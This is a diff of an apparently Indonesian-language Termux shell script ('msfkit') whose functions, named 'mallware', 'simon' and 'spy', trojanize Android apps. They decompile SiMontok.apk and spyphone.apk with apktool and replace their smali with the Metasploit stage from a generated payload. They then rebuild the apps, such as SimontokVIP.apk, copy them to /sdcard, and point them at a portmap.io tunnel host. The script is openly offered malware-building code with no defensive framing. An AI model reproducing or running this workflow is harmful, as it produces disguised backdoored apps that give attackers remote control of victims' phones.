@@ -366,7 +366,9 @@ echo $bi"----------------------------------------------------"
 echo
 echo $cy"sample => K1M4K-23035.portmap.io:23035 => 8888  "
 echo
-echo $cy"config =>     K1M4K-23035.portmap.io  "                                                                                                 sleep 1                                                                                                                                          echo
+echo $cy"config =>     K1M4K-23035.portmap.io  "                                                                                                 
+sleep 1                                                                                                                                          
+echo
 echo
 echo
 echo "setiap ip berbeda beda, sesuaikan ip anda"
@@ -375,7 +377,6 @@ echo $hi
 read -p "masukan configs atau ip lokal : " l
 echo
 sleep 0.01
-echo "----------------------------------------------------"
 sleep 2
 clear
 mallware
@@ -723,20 +724,20 @@ _pill
 
 simon(){
 ipori
-echo $ku
+echo $me
 clear
-banner
+mallware
 echo "wait for 35 minutes"
-echo
-cd msfkit && cd Payload
+echo $cy
+cd && cd msfkit && cd Payload
 mv -f SiMontok.apk ../Malware && cd && cd msfkit && cd Malware
 apktool d SiMontok.apk -o simontok && rm -fr Simontok.apk
 apktool d payload.apk -o payload && rm -fr payload.apk && cd
 cd msfkit/Malware && rm -fr simontok/smali/com/metasploit/stage
 mv -f payload/smali/com/metasploit/stage simontok/smali/com/metasploit/stage && cd
 cd msfkit/Malware && apktool b simontok -o SimontokVIP.apk && cd
-cd msfkit/Malware && mv -f SimontokVIP.apk /sdcard
-rm -fr *
+cd msfkit/Malware && mv -f SimontokVIP.apk /sdcard && cd
+cd msfkit/Malware && rm -fr *
 echo $hi
 echo "selesai"
 echo "----------------------------------------------------"
@@ -762,22 +763,22 @@ spy(){
 ipori
 echo $bi
 clear
-banner
+mallware
 echo $hi"[+] wait for 35 minutes"
 echo
-cd msfkit && cd Payload
+cd && cd msfkit && cd Payload
 mv -f spyphone.apk ../Malware && cd && cd msfkit && cd Malware
 apktool d spyphone.apk -o spyphone && rm -fr spyphone.apk
 apktool d payload.apk -o payload && rm -fr payload.apk && cd
 cd msfkit/Malware && rm -fr spyphone/smali/com/metasploit/stage
 mv -f payload/smali/com/metasploit/stage spyphone/smali/com/metasploit/stage && cd
 cd msfkit/Malware && apktool b spyphone -o spyphone.apk && cd
-cd msfkit/Malware && mv -f SimontokVIP.apk /sdcard
-rm -fr *
+cd msfkit/Malware && mv -f SimontokVIP.apk /sdcard && cd
+cd msfkit/Malware && rm -fr *
 echo $hi
 echo "selesai"
 echo "----------------------------------------------------"
-sleep 5
+sleep 7
 _pill
 bck
 }
